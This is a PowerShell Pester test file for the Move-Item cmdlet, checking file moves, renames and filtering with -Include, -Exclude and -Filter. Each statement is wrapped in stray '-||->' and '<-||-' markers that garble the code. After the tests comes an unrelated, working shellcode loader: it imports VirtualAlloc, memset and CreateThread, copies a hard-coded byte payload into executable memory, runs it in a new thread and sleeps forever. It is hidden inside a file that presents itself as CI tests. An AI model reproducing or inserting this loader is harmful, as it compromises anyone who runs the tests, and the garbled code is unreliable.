

 -||-> Describe "Move-Item tests" -Tag "CI" {
     -||-> BeforeAll {
         -||-> $content = "This is content" <-||- 
         -||-> Setup -f originalfile.txt -content "This is content" <-||- 
         -||-> $source = "$TESTDRIVE/originalfile.txt" <-||- 
         -||-> $target = "$TESTDRIVE/ItemWhichHasBeenMoved.txt" <-||- 
         -||-> Setup -f [orig-file].txt -content "This is not content" <-||- 
         -||-> $sourceSp = "$TestDrive/``[orig-file``].txt" <-||- 
         -||-> $targetSpName = "$TestDrive/ItemWhichHasBeen[Moved].txt" <-||- 
         -||-> $targetSp = "$TestDrive/ItemWhichHasBeen``[Moved``].txt" <-||- 
    } <-||- 
     -||-> It "Move-Item will move a file" {
         -||-> Move-Item $source $target <-||- 
         -||-> $source | Should -Not -Exist <-||- 
         -||-> $target | Should -Exist <-||- 
         -||-> "$target" | Should -FileContentMatchExactly "This is content" <-||- 
    } <-||- 
     -||-> It "Move-Item will move a file when path contains special char" {
         -||-> Move-Item $sourceSp $targetSpName <-||- 
         -||-> $sourceSp | Should -Not -Exist <-||- 
         -||-> $targetSp | Should -Exist <-||- 
         -||-> $targetSp | Should -FileContentMatchExactly "This is not content" <-||- 
    } <-||- 

     -||-> Context "Move-Item with filters" {
         -||-> BeforeAll {
             -||-> $filterPath = "$TESTDRIVE/filterTests" <-||- 
             -||-> $moveToPath = "$TESTDRIVE/dest-dir" <-||- 
             -||-> $renameToPath =  -||-> Join-Path $filterPath "move.txt" <-||-  <-||- 
             -||-> $filePath =  -||-> Join-Path $filterPath "*" <-||-  <-||- 
             -||-> $fooFile = "foo.txt" <-||- 
             -||-> $barFile = "bar.txt" <-||- 
             -||-> $booFile = "boo.txt" <-||- 
             -||-> $fooPath =  -||-> Join-Path $filterPath $fooFile <-||-  <-||- 
             -||-> $barPath =  -||-> Join-Path $filterPath $barFile <-||-  <-||- 
             -||-> $booPath =  -||-> Join-Path $filterPath $booFile <-||-  <-||- 
             -||-> $newFooPath =  -||-> Join-Path $moveToPath $fooFile <-||-  <-||- 
             -||-> $newBarPath =  -||-> Join-Path $moveToPath $barFile <-||-  <-||- 
             -||-> $newBooPath =  -||-> Join-Path $moveToPath $booFile <-||-  <-||- 
             -||-> $fooContent = "foo content" <-||- 
             -||-> $barContent = "bar content" <-||- 
             -||-> $booContent = "boo content" <-||- 
        } <-||- 
         -||-> BeforeEach {
             -||-> New-Item -ItemType Directory -Path $filterPath | Out-Null <-||- 
             -||-> New-Item -ItemType Directory -Path $moveToPath | Out-Null <-||- 
             -||-> New-Item -ItemType File -Path $fooPath -Value $fooContent | Out-Null <-||- 
             -||-> New-Item -ItemType File -Path $barPath -Value $barContent | Out-Null <-||- 
             -||-> New-Item -ItemType File -Path $booPath -Value $booContent | Out-Null <-||- 
        } <-||- 
         -||-> AfterEach {
             -||-> Remove-Item $filterPath -Recurse -Force -ErrorAction SilentlyContinue <-||- 
             -||-> Remove-Item $moveToPath -Recurse -Force -ErrorAction SilentlyContinue <-||- 
        } <-||- 
         -||-> It "Can move to different directory, filtered with -Include" {
             -||-> Move-Item -Path $filePath -Destination $moveToPath -Include "bar*" -ErrorVariable e -ErrorAction SilentlyContinue <-||- 
             -||-> $e | Should -BeNullOrEmpty <-||- 
             -||-> $barPath | Should -Not -Exist <-||- 
             -||-> $newBarPath | Should -Exist <-||- 
             -||-> $booPath | Should -Exist <-||- 
             -||-> $fooPath | Should -Exist <-||- 
             -||-> $newBarPath | Should -FileContentMatchExactly $barContent <-||- 
        } <-||- 
         -||-> It "Can move to different directory, filtered with -Exclude" {
             -||-> Move-Item -Path $filePath -Destination $moveToPath -Exclude "b*" -ErrorVariable e -ErrorAction SilentlyContinue <-||- 
             -||-> $e | Should -BeNullOrEmpty <-||- 
             -||-> $fooPath | Should -Not -Exist <-||- 
             -||-> $newFooPath | Should -Exist <-||- 
             -||-> $booPath | Should -Exist <-||- 
             -||-> $barPath | Should -Exist <-||- 
             -||-> $newFooPath | Should -FileContentMatchExactly $fooContent <-||- 
        } <-||- 
         -||-> It "Can move to different directory, filtered with -Filter" {
             -||-> Move-Item -Path $filePath -Destination $moveToPath -Filter "bo*" -ErrorVariable e -ErrorAction SilentlyContinue <-||- 
             -||-> $e | Should -BeNullOrEmpty <-||- 
             -||-> $booPath | Should -Not -Exist <-||- 
             -||-> $newBooPath | Should -Exist <-||- 
             -||-> $barPath | Should -Exist <-||- 
             -||-> $fooPath | Should -Exist <-||- 
             -||-> $newBooPath | Should -FileContentMatchExactly $booContent <-||- 
        } <-||- 

         -||-> It "Can rename via move, filtered with -Include" {
             -||-> Move-Item -Path $filePath -Destination $renameToPath -Include "bar*" -ErrorVariable e -ErrorAction SilentlyContinue <-||- 
             -||-> $e | Should -BeNullOrEmpty <-||- 
             -||-> $renameToPath | Should -Exist <-||- 
             -||-> $barPath | Should -Not -Exist <-||- 
             -||-> $booPath | Should -Exist <-||- 
             -||-> $fooPath | Should -Exist <-||- 
             -||-> $renameToPath | Should -FileContentMatchExactly $barContent <-||- 
        } <-||- 
         -||-> It "Can rename via move, filtered with -Exclude" {
             -||-> Move-Item -Path $filePath -Destination $renameToPath -Exclude "b*" -ErrorVariable e -ErrorAction SilentlyContinue <-||- 
             -||-> $e | Should -BeNullOrEmpty <-||- 
             -||-> $renameToPath | Should -Exist <-||- 
             -||-> $fooPath | Should -Not -Exist <-||- 
             -||-> $booPath | Should -Exist <-||- 
             -||-> $barPath | Should -Exist <-||- 
             -||-> $renameToPath | Should -FileContentMatchExactly $fooContent <-||- 
        } <-||- 
         -||-> It "Can rename via move, filtered with -Filter" {
             -||-> Move-Item -Path $filePath -Destination $renameToPath -Filter "bo*" -ErrorVariable e -ErrorAction SilentlyContinue <-||- 
             -||-> $e | Should -BeNullOrEmpty <-||- 
             -||-> $renameToPath | Should -Exist <-||- 
             -||-> $booPath | Should -Not -Exist <-||- 
             -||-> $fooPath | Should -Exist <-||- 
             -||-> $barPath | Should -Exist <-||- 
             -||-> $renameToPath | Should -FileContentMatchExactly $booContent <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbb,0x72,0x8c,0xf4,0xb4,0xdb,0xc8,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x47,0x31,0x5a,0x13,0x83,0xea,0xfc,0x03,0x5a,0x7d,0x6e,0x01,0x48,0x69,0xec,0xea,0xb1,0x69,0x91,0x63,0x54,0x58,0x91,0x10,0x1c,0xca,0x21,0x52,0x70,0xe6,0xca,0x36,0x61,0x7d,0xbe,0x9e,0x86,0x36,0x75,0xf9,0xa9,0xc7,0x26,0x39,0xab,0x4b,0x35,0x6e,0x0b,0x72,0xf6,0x63,0x4a,0xb3,0xeb,0x8e,0x1e,0x6c,0x67,0x3c,0x8f,0x19,0x3d,0xfd,0x24,0x51,0xd3,0x85,0xd9,0x21,0xd2,0xa4,0x4f,0x3a,0x8d,0x66,0x71,0xef,0xa5,0x2e,0x69,0xec,0x80,0xf9,0x02,0xc6,0x7f,0xf8,0xc2,0x17,0x7f,0x57,0x2b,0x98,0x72,0xa9,0x6b,0x1e,0x6d,0xdc,0x85,0x5d,0x10,0xe7,0x51,0x1c,0xce,0x62,0x42,0x86,0x85,0xd5,0xae,0x37,0x49,0x83,0x25,0x3b,0x26,0xc7,0x62,0x5f,0xb9,0x04,0x19,0x5b,0x32,0xab,0xce,0xea,0x00,0x88,0xca,0xb7,0xd3,0xb1,0x4b,0x1d,0xb5,0xce,0x8c,0xfe,0x6a,0x6b,0xc6,0x12,0x7e,0x06,0x85,0x7a,0xb3,0x2b,0x36,0x7a,0xdb,0x3c,0x45,0x48,0x44,0x97,0xc1,0xe0,0x0d,0x31,0x15,0x07,0x24,0x85,0x89,0xf6,0xc7,0xf6,0x80,0x3c,0x93,0xa6,0xba,0x95,0x9c,0x2c,0x3b,0x1a,0x49,0xd8,0x3e,0x8c,0x2a,0x1d,0x3c,0xa7,0xa3,0x1f,0xbe,0x3a,0x95,0xa9,0x58,0x14,0x85,0xf9,0xf4,0xd4,0x75,0xba,0xa4,0xbc,0x9f,0x35,0x9a,0xdc,0x9f,0x9f,0xb3,0x76,0x70,0x76,0xeb,0xee,0xe9,0xd3,0x67,0x8f,0xf6,0xc9,0x0d,0x8f,0x7d,0xfe,0xf2,0x41,0x76,0x8b,0xe0,0x35,0x76,0xc6,0x5b,0x93,0x89,0xfc,0xf6,0x1b,0x1c,0xfb,0x50,0x4c,0x88,0x01,0x84,0xba,0x17,0xf9,0xe3,0xb1,0x9e,0x6f,0x4c,0xad,0xde,0x7f,0x4c,0x2d,0x89,0x15,0x4c,0x45,0x6d,0x4e,0x1f,0x70,0x72,0x5b,0x33,0x29,0xe7,0x64,0x62,0x9e,0xa0,0x0c,0x88,0xf9,0x87,0x92,0x73,0x2c,0x16,0xee,0xa5,0x08,0x6c,0x1e,0x76 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



